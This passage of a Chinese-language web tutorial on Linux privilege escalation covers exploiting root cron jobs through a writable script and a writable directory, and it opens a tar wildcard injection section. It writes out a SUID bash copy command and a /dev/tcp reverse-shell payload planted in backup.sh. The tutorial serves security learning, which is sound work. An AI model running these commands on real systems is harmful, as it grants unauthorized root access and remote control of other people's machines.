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" width="325" height="95" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5利用-cron-jobs--弱文件权限"><strong><div id="id5">5、利用 Cron Jobs – 弱文件权限</div></strong><a href="#5利用-cron-jobs--弱文件权限" class="hash-link" aria-label="5利用-cron-jobs--弱文件权限的直接链接" title="5利用-cron-jobs--弱文件权限的直接链接">​</a></h2>
<p>在第二个例子中，我们检查了 LinPEAS 输出，发现根本没有任何红色/黄色标识。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113618668-396654264-68f08ac5008575da224b19dbe2cdd022.png" width="830" height="175" class="img_ev3q"></p>
<p>但我们看到一个 cron 任务以 root 身份每分钟运行一次，并且该任务正在使用绝对路径运行 <strong>/opt/scripts</strong> 目录中的脚本。</p>
<p>即使这不是红色/黄色标识，但也值得仔细观察！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="51确定如何利用-cron-job"><strong><div id="id5.1">5.1、确定如何利用 Cron Job</div></strong><a href="#51确定如何利用-cron-job" class="hash-link" aria-label="51确定如何利用-cron-job的直接链接" title="51确定如何利用-cron-job的直接链接">​</a></h4>
<p>此时我们不知道是否可以写入该脚本，因此我们需要检查的第一件事就是确定是否可以利用这个 cron 作业。</p>
<p>首先，我们应该检查 /opt/scripts 目录的权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /opt | grep &quot;scripts&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547239-989609797-bd0606272f03076551ddddd384b5e39f.png" width="425" height="45" class="img_ev3q"></p>
<p>这表明脚本目录归 root 所有，并且我们的用户只有读取/执行权限。</p>
<p>但是，我们可以对health-check.sh脚本本身拥有写权限，所以接下来让我们检查一下。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /opt/scripts | grep &quot;health-check.sh&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113606928-706307252-e88914156433889c74899ff5a0eab20f.png" width="555" height="48" class="img_ev3q"></p>
<p>太棒了！虽然我们没有目录的写入权限，但目录下的文件本身是所有人都可以写入的！</p>
<p>这意味着我们可以用恶意文件替换该文件，或者编辑它以便它为我们执行恶意命令。</p>
<p>接下来，我们应该阅读脚本，看看它在做什么。这将帮助我们确定是否最好编辑或替换该文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /opt/scripts/health-check.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113645519-315062066-3b1c9aefc8fc210cb3e2bc0029dd80a4.png" width="546" height="543" class="img_ev3q"></p>
<p>该脚本用于检查 Web 服务器是否已启动并正在运行。更重要的是，我们可以看到一个循环，并且脚本在测试完成后也会退出。</p>
<p>这意味着我们不能在脚本底部添加恶意命令，因为它永远不会执行。例如，如果循环中的第一个条件为真，脚本就会在此结束运行。脚本将永远无法执行我们的命令。</p>
<p>但是，我们在 SSH 会话中拥有完整的 TTY，因此可以使用 vim、nano 等文本编辑器编辑脚本，然后直接在受害者主机上进行编辑。</p>
<p>这样，我们就能将恶意命令放在脚本的开头，使其在循环之前运行。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="52设置漏洞并获取-root-shell"><strong><div id="id5.2">5.2、设置漏洞并获取 Root Shell</div></strong><a href="#52设置漏洞并获取-root-shell" class="hash-link" aria-label="52设置漏洞并获取-root-shell的直接链接" title="52设置漏洞并获取-root-shell的直接链接">​</a></h4>
<p>对于此示例，我们将以下命令添加到脚本中：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这告诉脚本将 /bin/bash 二进制文件复制到 /tmp，然后在 bash 的副本上设置 SUID 位。</p>
<p>接下来，我们需要找到已安装的文本编辑器。为此，我们将尝试使用常用的文本编辑器打开脚本，从 <strong>vim</strong> 开始：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vim /opt/scripts/health-check.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113645601-329207643-bfb02c7b982356c7d744d8abda66b955.png" width="548" height="589" class="img_ev3q"></p>
<p>完美！vim 已安装，我们可以将我们的命令添加到脚本的第一项执行内容中。</p>
<p>现在我们等待，但不会持续太久，因为不到一分钟后，我们的 SUID bash 二进制文件就出现在 /tmp 目录中！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547517-1390036696-b2701b0f58065c0d6a2a6a6158465940.png" width="871" height="154" class="img_ev3q"></p>
<p>太棒了！cron 任务在运行脚本的其余部分之前运行了我们的恶意命令，然后创建了一个 SUID bash 二进制文件！</p>
<p>由于 bash 副本二进制文件的所有人是 root，因此我们可以使用它轻松进入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547438-721717965-5da781805ad43b7a213483be21cf2943.png" width="809" height="95" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="6利用-cron-jobs--弱目录权限"><strong><div id="id6">6、利用 Cron Jobs – 弱目录权限</div></strong><a href="#6利用-cron-jobs--弱目录权限" class="hash-link" aria-label="6利用-cron-jobs--弱目录权限的直接链接" title="6利用-cron-jobs--弱目录权限的直接链接">​</a></h2>
<p>这个示例与上一个示例非常相似；不过，为了使其与众不同，我们将回顾一个涉及脚本丢失的有趣用例。</p>
<p>检查 LinPEAS 输出，我们可以看到这个 cron 作业看起来与我们上次看到的非常相似，但这次它被标记为红色/黄色标识。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547527-1632173361-c556fb8493b165cc729103db13c21862.png" width="829" height="168" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="61确定如何利用-cron-job"><strong><div id="id6.1">6.1、确定如何利用 Cron Job</div></strong><a href="#61确定如何利用-cron-job" class="hash-link" aria-label="61确定如何利用-cron-job的直接链接" title="61确定如何利用-cron-job的直接链接">​</a></h4>
<p>看到 /opt/scripts 为红色/黄色标识表明我们当前的用户应该对该目录具有写权限。</p>
<p>为了确认这一点，我们可以使用以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /opt | grep &quot;scripts&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547217-160131768-90141591862436f5a191ed12c4ef40b9.png" width="458" height="47" class="img_ev3q"></p>
<p>太棒了！这证实了我们当前的用户确实在 /opt/scripts 目录中具有写权限！</p>
<p>这意味着我们应该能够备份当前的脚本，然后用恶意脚本替换它。</p>
<p>然而，当我们检查脚本时，却找不到它……</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /opt/scripts</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113546465-1068062148-bf9c06a7c605d02609ace16fd8764343.png" width="462" height="94" class="img_ev3q"></p>
<p>我猜这意味着我们将无法利用这个 cron 作业，因为脚本不存在？</p>
<p>其实不然！我们仍然可以利用这个 cron 作业！</p>
<p>由于我们拥有 /opt/scripts 目录的写入权限，因此我们可以自己创建脚本。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="62设置漏洞并获取-root-shell"><strong><div id="id6.2">6.2、设置漏洞并获取 Root Shell</div></strong><a href="#62设置漏洞并获取-root-shell" class="hash-link" aria-label="62设置漏洞并获取-root-shell的直接链接" title="62设置漏洞并获取-root-shell的直接链接">​</a></h4>
<p>对于这个例子，我们将创建一个反向 shell payload 并将脚本命名为 <strong>backup.sh</strong>。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#!/bin/bash&#x27; &gt; /opt/scripts/backup.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;&quot; &gt;&gt; /opt/scripts/backup.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;bash -i &gt;&amp; /dev/tcp/172.16.1.30/443 0&gt;&amp;1&#x27; &gt;&gt; /opt/scripts/backup.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547261-621717573-487e1044c47abdfcfa24e0d630360334.png" width="826" height="127" class="img_ev3q"></p>
<p>脚本创建完成后，我们需要赋予它执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 /opt/scripts/backup.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113554474-9243498-7650d455b951608fa8906ed5d9ec448b.png" width="499" height="123" class="img_ev3q"></p>
<p>最后，我们需要回到攻击机器，在 443 端口启动 netcat 监听器。不到一分钟后，我们的 root shell 就会登录。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547353-359030796-d1aae19ef890181e4934f5caa77dd1e6.png" width="660" height="211" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="7利用-cron-jobs--tar-通配符注入"><strong><div id="id7">7、利用 Cron Jobs – tar 通配符注入</div></strong><a href="#7利用-cron-jobs--tar-通配符注入" class="hash-link" aria-label="7利用-cron-jobs--tar-通配符注入的直接链接" title="7利用-cron-jobs--tar-通配符注入的直接链接">​</a></h2>
<p>在这个例子中，我们通过利用运行在 80 端口的网络服务器，在目标上建立了立足点。</p>
<p>这次，我们找到了一种上传 PHP 脚本并执行的方法，从而以用户<strong>www-data</strong> 的身份获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113608523-412099232-f3862b815ce2531d8cf66b7e407dd4b9.png" width="665" height="159" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="71将-shell-升级到完整-tty"><strong><div id="id7.1">7.1、将 Shell 升级到完整 TTY</div></strong><a href="#71将-shell-升级到完整-tty" class="hash-link" aria-label="71将-shell-升级到完整-tty的直接链接" title="71将-shell-升级到完整-tty的直接链接">​</a></h4>
<p>由于我们使用 netcat 获取了这个 shell，所以我们应该尝试升级到完整的 TTY。</p>
<p>请记住，这个步骤对于这个特定示例的运行并不是必需的，但这是一个很好的练习。</p>
<blockquote>
<p>尝试将基本 shell（终端）升级为完整的 TTY 总是个好主意。如果你有兴趣，我在关于手动枚举的[文章](<a href="https://juggernaut-sec.com/manual-enumeration-lpe/#Terminal_Upgrade_to_Full_TTY" target="_blank" rel="noopener noreferrer">Manual Enumeration – Linux Privilege Escalation</a>)中详细说明了这一点的重要性。</p>
</blockquote>
